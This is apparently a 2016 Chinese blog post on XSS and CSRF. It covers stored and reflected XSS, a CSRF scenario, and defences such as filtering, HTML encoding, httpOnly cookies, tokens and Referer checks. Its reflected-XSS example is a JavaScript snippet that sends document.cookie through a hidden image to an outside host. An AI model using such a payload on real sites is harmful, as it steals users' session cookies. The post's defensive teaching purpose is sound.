---
title: XSS和CSRF防御
date: 2016-12-13 14:02:51
tags: 
---
XSS和CSRF(XSRF)都属于跨站攻击，XSS是实现CSRF(XSRF)诸多途径中的一条，但不是唯一一条。

<!-- more -->

### 原理

XSS的本质是让对方浏览器执行你插入的js ，来获取`cookie`等信息；
CSRF(XSRF)是借用用户的身份，向服务器发送请求。

### XSS的类型

##### 储存型

储存型的XSS代码是储存在服务器端，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，用户访问该页面的时候触发代码执行。这种XSS比较危险，容易造成蠕虫，盗窃 `cookie` 等。

##### 反射型

反射型XSS需要欺骗用户自己去点击链接才能触发XSS代码。发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS。

**Example:**

```js
var img = document.createElement('img');
img.src = 'http://www.xss.com?cookie=' + document.cookie;
img.style.display = 'none';
document.getElementByTagName('body')[0].appendChild(img);

// 这样就能在用户不知道的情况下将用户在该网站的 `cookie` 信息以 `get` 请求的方式发送给另一个地址。
```

### XSS的防范

客户端校验用户输入信息，只允许输入合法的值，其他一概过滤掉，防止客户端输入恶意的js代码被植入到HTML代码中，使得js代码得以执行。

**Example:**

* 移除用户上传的DOM属性，如 `onerror` 等。
* 移除用户上传的 `style`节点，`script`节点，`iframe`节点等。
* 对用户输入的代码标签进行转换(html encode)。
* 对url中的参数进行过滤。
* 对动态输出到页面的内容进行HTML编码。
* 服务端对敏感的 `Cookie` 设置 `httpOnly` 属性，使js脚本不能读取到 `cookie`。

**题外话：**
目前很多浏览器都会自身对用户的输入进行判断，检测是否存在攻击字符，比如你上述提到的 `script` 标签，这段脚本很明显就是一段XSS攻击，因此浏览器会对这段输入进行处理，不同的浏览器处理方式也不一样。

### CSRF(XSRF)的过程

**Example:**

* 用户小明在你的网站A上面登录了，A返回了一个 `session ID` (使用cookie存储)。
* 小明的浏览器保持着A网站的登录状态，攻击者小强给小明发送了一个链接地址。
* 小明打开了地址的时候，这个页面已经自动的对网站a发送了一个请求。
* 通过使用小明的cookie信息，这样攻击者小强就可以随意更改小明在A上的信息。

### CSRF(XSRF)的防范

* **使用token：** 服务器随机产生 `tooken`，然后以 `tooken为秘钥产生一段密文`，把 `token和密文` 都随 `cookie` 交给前端，前端发起请求时把 `密文和token` 交给后端看 `token` 能不能生成同样的密文，这样即使黑客拿到了 `token` 也无法拿到密文。

* **使用验证码：** 每一个重要的 `post` 提交页面，使用一个验证码，因为第三方网站是无法获得验证码的。

* **检测http的头信息refer：** `Referer` 记录了请求的来源地址，服务器可以验证这个来源地址是否合法。

* **更改请求方式：** 涉及敏感操作的请求改为 `POST` 请求。
